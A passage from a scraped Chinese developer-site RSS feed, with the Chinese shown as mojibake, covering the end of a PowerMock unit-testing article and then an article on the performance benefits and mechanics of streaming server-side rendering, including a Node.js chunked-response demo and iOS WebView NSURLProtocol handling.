<p><strong>JUnit 5æ”¯æŒ</strong>ï¼šæˆªè‡³ç›®å‰ï¼ŒPowerMockä¸æ”¯æŒJUnit 5ï¼Œè¿™æ˜¯é€‰æ‹©æµ‹è¯•æ¡†æ¶æ—¶éœ€è¦è€ƒè™‘çš„å› ç´ ã€‚</p>
<h3 data-id="heading-17">å¸¸è§é—®é¢˜æ’æŸ¥</h3>
<p><strong>ç±»åŠ è½½å™¨å†²çª</strong>ï¼šä½¿ç”¨<code>@PowerMockIgnore</code>æ³¨è§£æ’é™¤å†²çªçš„åŒ…ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@PowerMockIgnore({"javax.management.*", "javax.net.ssl.*"})</span>
</code></pre>
<p><strong>ç‰ˆæœ¬å†²çª</strong>ï¼šç¡®ä¿æ‰€æœ‰Mockç›¸å…³åº“çš„ç‰ˆæœ¬å…¼å®¹ã€‚</p>
<p><strong>é™æ€æ–¹æ³•éªŒè¯å¤±è´¥</strong>ï¼šè®°ä½æ¯æ¬¡éªŒè¯é™æ€æ–¹æ³•è°ƒç”¨æ—¶éƒ½è¦å…ˆè°ƒç”¨<code>verifyStatic()</code>ã€‚</p>
<h2 data-id="heading-18">æ€»ç»“</h2>
<p>PowerMockè§£å†³äº†ä¼ ç»ŸMockæ¡†æ¶æ— æ³•å¤„ç†çš„æ£˜æ‰‹é—®é¢˜ã€‚é€šè¿‡å­—èŠ‚ç æ“ä½œæŠ€æœ¯ï¼ŒPowerMockèƒ½å¤ŸMocké™æ€æ–¹æ³•ã€finalç±»ã€ç§æœ‰æ–¹æ³•å’Œæ„é€ å‡½æ•°ç­‰"ä¸å¯Mock"çš„å…ƒç´ ã€‚</p>
<p><strong>æ ¸å¿ƒä»·å€¼</strong>ï¼š</p>
<ul>
<li>å¡«è¡¥äº†Mockitoçš„åŠŸèƒ½ç©ºç™½ï¼Œå®Œå–„äº†Javaå•å…ƒæµ‹è¯•çš„å·¥å…·é“¾ã€‚</li>
<li>ç‰¹åˆ«é€‚ç”¨äºå¤„ç†é—ç•™ä»£ç å’Œç¬¬ä¸‰æ–¹åº“çš„æµ‹è¯•é—®é¢˜ã€‚</li>
<li>é€šè¿‡æé«˜ä»£ç è¦†ç›–ç‡æ¥æå‡è½¯ä»¶è´¨é‡ã€‚</li>
</ul>
<p><strong>é€‚ç”¨è¾¹ç•Œ</strong>ï¼š</p>
<ul>
<li>ä¸æ˜¯æ‰€æœ‰åœºæ™¯éƒ½é€‚åˆä½¿ç”¨PowerMockï¼Œæ–°é¡¹ç›®åº”ä¼˜å…ˆè€ƒè™‘è‰¯å¥½çš„ä»£ç è®¾è®¡ã€‚</li>
<li>åœ¨æµ‹è¯•æ€§èƒ½å’Œä»£ç å¯ç»´æŠ¤æ€§ä¹‹é—´éœ€è¦æƒè¡¡ã€‚</li>
<li>å»ºè®®å°†ä½¿ç”¨èŒƒå›´æ§åˆ¶åœ¨ç¡®å®å¿…è¦çš„å¤æ‚åœºæ™¯ä¸­ã€‚</li>
</ul>
<p>å¸Œæœ›æœ¬æ–‡èƒ½å¸®åŠ©ä½ åœ¨å®é™…é¡¹ç›®ä¸­æ›´å¥½åœ°ä½¿ç”¨PowerMockã€‚å¦‚æœä½ æœ‰ä»»ä½•é—®é¢˜æˆ–ç»éªŒåˆ†äº«ï¼Œæ¬¢è¿åœ¨è¯„è®ºåŒºç•™è¨€äº¤æµï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æµ…å…¥ç†è§£æµå¼SSRçš„æ€§èƒ½æ”¶ç›Šä¸å·¥ä½œåŸç†]]></title>    <link>https://juejin.cn/post/7575090551357407284</link>    <guid>https://juejin.cn/post/7575090551357407284</guid>    <pubDate>2025-11-23T04:51:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575090551357407284" data-draft-id="7570912420568481802" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æµ…å…¥ç†è§£æµå¼SSRçš„æ€§èƒ½æ”¶ç›Šä¸å·¥ä½œåŸç†"/> <meta itemprop="keywords" content="å‰ç«¯,iOS"/> <meta itemprop="datePublished" content="2025-11-23T04:51:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ˜è¿œæ¹–ä¹‹é±¼"/> <meta itemprop="url" content="https://juejin.cn/user/2370998127573751"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æµ…å…¥ç†è§£æµå¼SSRçš„æ€§èƒ½æ”¶ç›Šä¸å·¥ä½œåŸç†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2370998127573751/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ˜è¿œæ¹–ä¹‹é±¼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T04:51:36.000Z" title="Sun Nov 23 2025 04:51:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä»€ä¹ˆæ˜¯æµå¼ SSR</h2>
<p>æµå¼ SSRï¼ˆStreaming Server-Side Renderingï¼‰æ˜¯ä¸€ç§å°†æœåŠ¡ç«¯æ¸²æŸ“å’Œæµå¼ä¼ è¾“ç»“åˆèµ·æ¥çš„æŠ€æœ¯ã€‚ä¸ä¼ ç»Ÿçš„ SSR ä¸åŒï¼Œæµå¼ SSR å¯ä»¥åœ¨æœåŠ¡ç«¯æ¸²æŸ“çš„åŒæ—¶ï¼Œé€æ­¥å°†æ¸²æŸ“ç»“æœä¼ è¾“åˆ°å®¢æˆ·ç«¯ï¼Œå®ç°é¡µé¢çš„æ¸è¿›å¼å±•ç¤ºã€‚</p>
<p>åœ¨æµå¼ SSR ä¸­ï¼ŒæœåŠ¡ç«¯ä¼šæ ¹æ®å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œé€æ­¥ç”Ÿæˆé¡µé¢å†…å®¹ï¼Œå¹¶å°†å®ƒä»¬ä½œä¸ºæµå¼æ•°æ®æµå¼ä¼ è¾“åˆ°å®¢æˆ·ç«¯ã€‚å®¢æˆ·ç«¯å¯ä»¥åœ¨æ¥æ”¶åˆ°ä¸€éƒ¨åˆ†æ•°æ®åï¼Œå°±å¼€å§‹é€æ­¥æ˜¾ç¤ºé¡µé¢ï¼Œè€Œä¸éœ€è¦ç­‰å¾…æ•´ä¸ªé¡µé¢æ¸²æŸ“å®Œæˆã€‚è¿™ç§æ–¹å¼å¯ä»¥æœ‰æ•ˆæé«˜é¡µé¢çš„åŠ è½½é€Ÿåº¦å’Œç”¨æˆ·ä½“éªŒã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c8d597f865b43c79abefb42c03ca09c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piO6L-c5rmW5LmL6bG8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478296&amp;x-signature=7%2BPppr%2BKU2I0Z%2BX22ELwntltuHU%3D" alt="20251111002406.jpg" loading="lazy"/>
(æµå¼ SSR çš„é¡µé¢åŠ è½½è¿‡ç¨‹ï¼‰</p>
<h2 data-id="heading-1">ä½¿ç”¨æµå¼ SSR çš„æ”¶ç›Š</h2>
<ul>
<li>
<p><strong>å‡å°‘è®¾å¤‡å’Œç½‘ç»œæƒ…å†µçš„å‰¯ä½œç”¨</strong></p>
<p>è¿™æ˜¯ SSR æ¸²æŸ“æ¨¡å¼ç›¸æ¯”äºä¼ ç»Ÿ  CSR æ¸²æŸ“æ¨¡å¼å¸¦æ¥çš„ä¼˜åŠ¿ï¼Œå¯¹äºæµå¼ SSR åº”ç”¨åŒæ ·é€‚ç”¨ã€‚
CSR æ¸²æŸ“æ¨¡å¼éœ€è¦åœ¨ç»ˆç«¯è®¾å¤‡ä¸Šå®Œæˆèµ„æºåŠ è½½ã€æ•°æ®åŠ è½½ä»¥åŠæ•´ä¸ªæ¸²æŸ“è¿‡ç¨‹ï¼Œå—ç«¯ä¾§è®¾å¤‡è‡ªèº« CPU åŠç½‘ç»œæ€§èƒ½å½±å“å¤§ï¼Œå¦‚è®¾å¤‡ CPU æ€§èƒ½ä¸è¶³æˆ–ç½‘ç»œæ³¢åŠ¨è¾ƒå¤§ï¼Œåˆ™æ­¤æ—¶æ•´ä¸ªé¡µé¢åŠ è½½æ€§èƒ½å°†ä¸¥é‡ä¸‹é™ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå¾ˆå¤šé¡µé¢åœ¨é«˜ç«¯è®¾å¤‡ä¸ŠåŠ è½½é€Ÿåº¦è¾ƒå¿«ï¼Œä½†åœ¨ä½ç«¯è®¾å¤‡ä¸Šéœ€è¦7-8ç§’çš„åŸå› ã€‚</p>
<p>è€Œ SSR çš„æ¸²æŸ“æ¨¡å¼ï¼Œåˆ™<strong>åœ¨æœåŠ¡ç«¯æä¾›äº†é«˜æ€§èƒ½çš„æ¸²æŸ“å®¹å™¨åŠç½‘ç»œç¯å¢ƒï¼ŒæœåŠ¡ç«¯çš„æ¸²æŸ“ï¼Œä¸å—ç«¯ä¾§è®¾å¤‡ CPU æˆ–ç½‘ç»œå½±å“ï¼Œå§‹ç»ˆæä¾›ç¨³å®šçš„æ¸²æŸ“æ€§èƒ½è¡¨ç°</strong>ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba73baf6b12b44a0b7b6055b1c45b7fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piO6L-c5rmW5LmL6bG8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478296&amp;x-signature=vYH5fhaZmJ1rFH8%2FPW4m4SNzkW0%3D" alt="fa9a1944-b6b4-4e22-980a-47bf604c2e2c.png" loading="lazy"/></p>
</li>
<li>
<p><strong>å‡å°‘æ¥å£è¿‡æ…¢å¯¹é¦–å±æ€§èƒ½çš„å½±å“</strong></p>
<p>é€šå¸¸ï¼Œé¡µé¢ä¼šç”±å¤šä¸ªåŒºå—ç»„æˆï¼Œå…¶ä¸­ä¸€äº›åŒºå—ä¸ä¾èµ–äºæ•°æ®ï¼Œè€Œå…¶ä»–åŒºå—å¯èƒ½ä¾èµ–äºå¿«é€Ÿæˆ–ç¼“æ…¢å“åº”çš„æ¥å£ã€‚</p>
<p>ç°æœ‰ SSR æ¸²æŸ“æ¨¡å¼å­˜åœ¨çš„ä¸€ä¸ªä¸è¶³æ˜¯ï¼Œæ•´ä¸ªæ¸²æŸ“è¿‡ç¨‹æ˜¯åŒæ­¥çš„ï¼Œéœ€è¦åœ¨é¡µé¢æ¸²æŸ“ä¹‹å‰å®Œæˆæ‰€æœ‰æ•°æ®è¯·æ±‚ï¼Œå¹¶ä¸€æ¬¡æ€§è¿”å›æ•´ä¸ªé¡µé¢çš„ HTMLã€‚å¦‚æœé¡µé¢çš„æŸäº›æ¥å£å“åº”è¿‡æ…¢ï¼Œå°†ä¼šå¯¼è‡´æ•´ä¸ªé¡µé¢çš„å“åº”æ—¶é—´è¿‡é•¿ã€‚</p>
<p>æµå¼æ¸²æŸ“çš„æœ€å¤§å¥½å¤„åœ¨äºå®ƒå¯ä»¥åˆ†å—è¿”å›é¡µé¢å†…å®¹ã€‚ä¾‹å¦‚ï¼Œå½“è¯·æ±‚è¿›å…¥æ—¶ï¼Œå®ƒå¯ä»¥é¦–å…ˆå®Œæˆé¡µé¢é™æ€å†…å®¹çš„æ¸²æŸ“å¹¶å“åº”ç»™ç«¯ä¾§è¿›è¡Œæ¸²æŸ“ï¼Œç­‰å¾…å…¶ä»–ä¾èµ–äºæ•°æ®çš„åŒºå—å®Œæˆæ¸²æŸ“åå†åˆ†å—è¿”å›ã€‚è¿™æ ·æ•´ä¸ªé¡µé¢çš„æ¸²æŸ“è¿‡ç¨‹ä¸å†ç»‘å®šåœ¨ä¸€èµ·ï¼Œè€Œæ˜¯ä¸€ä¸ªå¼‚æ­¥çš„è¿‡ç¨‹ï¼Œå…ˆå®Œæˆæ¸²æŸ“çš„éƒ¨åˆ†å°†å…ˆè¿”å›ï¼Œä»è€Œä¼˜åŒ–äº†é¡µé¢å“åº”é€Ÿåº¦ã€‚</p>
</li>
<li>
<p><strong>æå‰èµ„æºçš„åŠ è½½æ—¶æœº</strong></p>
<p>æµå¼ SSR ç›¸æ¯”ä¼ ç»Ÿ SSR åº”ç”¨æœ‰å¦ä¸€ä¸ªé¢å¤–çš„æ”¶ç›Šæ˜¯ï¼Œç”±äº HTML å¯ä»¥åˆ†å—è¿”å›ï¼Œé¡µé¢çš„èµ„æºä¿¡æ¯å¯ä»¥éšç¬¬ä¸€ä¸ª HTML ç‰‡æ®µä¸€èµ·ä¸‹å‘ï¼Œä»è€Œå°½å¿«å¼€å§‹åŠ è½½ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œåœ¨ä¼ ç»Ÿ SSR åº”ç”¨ä¸­ï¼Œèµ„æºä¿¡æ¯å¿…é¡»ç­‰å¾…æ•´ä¸ª HTML å®Œæˆæ¸²æŸ“åä¸‹å‘ï¼Œè¯·æ±‚å¼€å§‹çš„æ—¶æœºä¼šå—åˆ°æ¸²æŸ“è¿‡ç¨‹çš„é˜»å¡ã€‚</p>
<p>é‡‡ç”¨æµå¼ SSRï¼Œå¯ä»¥ä½¿èµ„æºè¯·æ±‚å’Œé¡µé¢æ¸²æŸ“è¿‡ç¨‹å¹¶è¡Œè¿›è¡Œï¼Œè¿›ä¸€æ­¥æå‡äº†é¡µé¢çš„æ€§èƒ½è¡¨ç°ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/262454a66ef1469789c973908bdfdf86~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piO6L-c5rmW5LmL6bG8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478296&amp;x-signature=pueQsCLST%2FVr2owHTM95M6HTlvU%3D" alt="752472f2-cf39-4c89-9738-e4ad3e084ba9.png" loading="lazy"/></p>
</li>
<li>
<p><strong>æå‡é¡µé¢çš„å¯äº¤äº’æ—¶é—´</strong></p>
<p>åœ¨ SSR æ¸²æŸ“æ¨¡å¼ä¸‹ï¼Œå°†é¡µé¢èŠ‚ç‚¹è¾¾åˆ°å¯äº¤äº’çŠ¶æ€çš„è¿‡ç¨‹ç§°ä¸º Hydrateï¼Œå®ƒéœ€è¦åœ¨ç«¯ä¾§æ‰§è¡Œ JavaScriptã€‚</p>
<p>ç”±äºé¡µé¢èµ„æºå¯ä»¥æå‰ä¸‹å‘ï¼Œå¹¶ä¸” React 18 å¯¹ Hydrate è¿›è¡Œäº†å¼‚æ­¥åŒ–å¤„ç†ï¼Œåœ¨æµå¼ SSR åº”ç”¨ä¸­ï¼Œå¯ä»¥è¿›ä¸€æ­¥å®ç°å…ˆæ¸²æŸ“çš„é¡µé¢å…ˆè¾¾åˆ°å¯äº¤äº’çŠ¶æ€çš„æ•ˆæœã€‚å¯¹äºéƒ¨åˆ†é¦–å±æ¥å£è¾ƒæ…¢çš„åº”ç”¨ï¼Œè¿™å°†è¿›ä¸€æ­¥æå‡é¡µé¢çš„å¯äº¤äº’ä½“éªŒã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fb6d50f24ad84d6397f6b472e57ce551~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piO6L-c5rmW5LmL6bG8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478296&amp;x-signature=sxEYVIj6yhciBVEKqwOPNJXnz1c%3D" alt="20251111002828.jpg" loading="lazy"/></p>
</li>
</ul>
<h2 data-id="heading-2">åŸºæœ¬å·¥ä½œåŸç†</h2>
<p>æµå¼ SSR çš„å®ç°ï¼Œæœ€åŸºæœ¬çš„åŸç†æ˜¯ï¼š</p>
<ul>
<li>åŸºäº HTTP åè®®ä¸­çš„ chunked ç¼–ç è§„èŒƒï¼Œè®¾ç½®å“åº”å¤´çš„ Transfer-Encoding ä¸º chunked å¯¹ HTML å†…å®¹è¿›è¡Œåˆ†å—ä¼ è¾“ã€‚</li>
<li>åœ¨æµè§ˆå™¨ä¾§ï¼Œæµå¼åœ°è¯»å–æ•°æ®å¹¶è¿›è¡Œæ¸²æŸ“ï¼Œè¿™æ˜¯ä¸»æµæµè§ˆå™¨é»˜è®¤æ”¯æŒçš„ã€‚</li>
</ul>
<p>ç»“åˆ Node.js å†…ç½®çš„ HTTP æ¨¡å—ï¼Œå®ç°ä¸€ä¸ªæœ€ç®€å•çš„æµå¼ DEMO ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">'http'</span>);

<span class="hljs-keyword">const</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-keyword">async</span> (req, res) =&gt; {
  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Content-Type'</span>, <span class="hljs-string">'text/html'</span>);
  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Transfer-Encoding'</span>, <span class="hljs-string">'chunked'</span>)

  <span class="hljs-comment">// åˆ†åŒºå—çš„ä¼ è¾“é¡µé¢å†…å®¹</span>
  res.<span class="hljs-title function_">write</span>(<span class="hljs-string">'&lt;html&gt;'</span>);
  res.<span class="hljs-title function_">write</span>(<span class="hljs-string">'&lt;head&gt;&lt;title&gt;Stream Demo&lt;/title&gt;&lt;head&gt;'</span>);
  res.<span class="hljs-title function_">write</span>(<span class="hljs-string">'&lt;body&gt;'</span>);

  <span class="hljs-comment">// æ¨¡æ‹ŸæœåŠ¡ç«¯æš‚åœ</span>
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">3000</span>);
  res.<span class="hljs-title function_">write</span>(<span class="hljs-string">'&lt;h2&gt;Hello&lt;/h2&gt;'</span>);

  <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">3000</span>);
  res.<span class="hljs-title function_">write</span>(<span class="hljs-string">'&lt;h2&gt;ICE 3&lt;/h2&gt;'</span>);
  res.<span class="hljs-title function_">write</span>(<span class="hljs-string">'&lt;/body&gt;&lt;/html&gt;'</span>);
  res.<span class="hljs-title function_">end</span>();
});

server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>);
</code></pre>
<p>åŸºäºè¿™ä¸ªåŸºæœ¬åŸç†ï¼Œå°†é¡µé¢åˆ†ä¸ºéª¨æ¶å±å’Œå‡ ä¸ªåŒºå—ï¼Œå¹¶è¡Œåœ°æ¸²æŸ“è¿™äº›åŒºå—ï¼Œç„¶åå°†æ¸²æŸ“å¥½çš„åŒºå—åˆ†æ®µè¿”å›ï¼Œå°±å¯ä»¥å®ç°åŸºæœ¬çš„æµå¼ SSR ã€‚</p>
<h2 data-id="heading-3">WebView æ¥æ”¶æµå¼Chunkæ¸²æŸ“çš„å®ç°åŸç†ï¼ˆiOSï¼‰</h2>
<h3 data-id="heading-4">æ ¸å¿ƒç»„ä»¶</h3>
<p>iOS WebView æ¥æ”¶æµå¼ Chunk æ¸²æŸ“åŸºäº <strong>NSURLProtocol æ‹¦æˆªæœºåˆ¶</strong> + <strong>NSURLProtocolClient å›è°ƒæœºåˆ¶</strong> å®ç°ã€‚</p>
<p><strong>NSURLProtocolï¼ˆè¯·æ±‚æ‹¦æˆªå™¨ï¼‰</strong>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æ‹¦æˆª WebView çš„ç½‘ç»œè¯·æ±‚</span>
+ (<span class="hljs-variable constant_">BOOL</span>)<span class="hljs-attr">canInitWithRequest</span>:(<span class="hljs-title class_">NSURLRequest</span> *)request {
    <span class="hljs-keyword">return</span> [self <span class="hljs-attr">shouldInterceptRequest</span>:request];
}

- (<span class="hljs-keyword">void</span>)startLoading {
    <span class="hljs-comment">// è½¬å‘ç»™è‡ªå®šä¹‰å¤„ç†å™¨</span>
    [[<span class="hljs-title class_">SSRHandler</span> shareInstance] <span class="hljs-attr">sendRequest</span>:self.<span class="hljs-property">request</span> <span class="hljs-attr">delegate</span>:self];
}
</code></pre>
<p><strong>NSURLProtocolClientï¼ˆæ•°æ®ä¼ é€’æ¡¥æ¢ï¼‰</strong>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ç³»ç»Ÿæä¾›çš„åè®®ï¼Œç”¨äºå‘ WebView ä¼ é€’æ•°æ®</span>
@protocol <span class="hljs-title class_">NSURLProtocolClient</span>
- (<span class="hljs-keyword">void</span>)<span class="hljs-title class_">URLProtocol</span>:<span class="hljs-attr">didReceiveResponse</span>:<span class="hljs-attr">cacheStoragePolicy</span>:;  <span class="hljs-comment">// å“åº”å¤´</span>
- (<span class="hljs-keyword">void</span>)<span class="hljs-title class_">URLProtocol</span>:<span class="hljs-attr">didLoadData</span>:;                           <span class="hljs-comment">// æ•°æ®å—ï¼ˆå¯å¤šæ¬¡ï¼‰</span>
- (<span class="hljs-keyword">void</span>)<span class="hljs-title class_">URLProtocolDidFinishLoading</span>:;                       <span class="hljs-comment">// å®Œæˆ</span>
- (<span class="hljs-keyword">void</span>)<span class="hljs-title class_">URLProtocol</span>:<span class="hljs-attr">didFailWithError</span>:;                      <span class="hljs-comment">// é”™è¯¯</span>
@end

</code></pre>
<h3 data-id="heading-5">æ¸²æŸ“æµç¨‹</h3>
<ul>
<li>
<p><strong>é˜¶æ®µä¸€ï¼šè¯·æ±‚æ‹¦æˆª</strong></p>
<pre><code class="hljs language-objectivec" lang="objectivec">WebView å‘èµ·è¯·æ±‚ â†’ <span class="hljs-built_in">NSURLProtocol</span> æ‹¦æˆª â†’ è½¬å‘ç»™ SSR å¤„ç†å™¨
</code></pre>
</li>
<li>
<p><strong>é˜¶æ®µäºŒï¼šå“åº”å¤„ç†</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 1. è¿”å›å“åº”å¤´</span>
[<span class="hljs-meta">client URLProtocol:protocol didReceiveResponse:response cacheStoragePolicy:policy</span>];

<span class="hljs-comment">// 2. æµå¼è¿”å›æ•°æ®ï¼ˆå…³é”®æ­¥éª¤ï¼‰</span>
[<span class="hljs-meta">client URLProtocol:protocol didLoadData:chunk1</span>];  <span class="hljs-comment">// ç¬¬1å—</span>
[<span class="hljs-meta">client URLProtocol:protocol didLoadData:chunk2</span>];  <span class="hljs-comment">// ç¬¬2å—</span>
[<span class="hljs-meta">client URLProtocol:protocol didLoadData:chunkN</span>];  <span class="hljs-comment">// ç¬¬Nå—</span>

<span class="hljs-comment">// 3. æ ‡è®°å®Œæˆ</span>
[<span class="hljs-meta">client URLProtocolDidFinishLoading:protocol</span>];
</code></pre>
</li>
<li>
<p><strong>é˜¶æ®µä¸‰ï¼šWebView æ¸²æŸ“</strong></p>
<pre><code class="hljs language-css" lang="css">æ¯æ¬¡ didLoadData è°ƒç”¨ â†’ WebView å¢é‡è§£æ <span class="hljs-selector-tag">HTML</span> â†’ å®æ—¶æ¸²æŸ“åˆ°é¡µé¢
</code></pre>
</li>
</ul>
<p><strong>æ•°æ®æµå›¾ç¤ºå¦‚ä¸‹</strong>ï¼š</p>
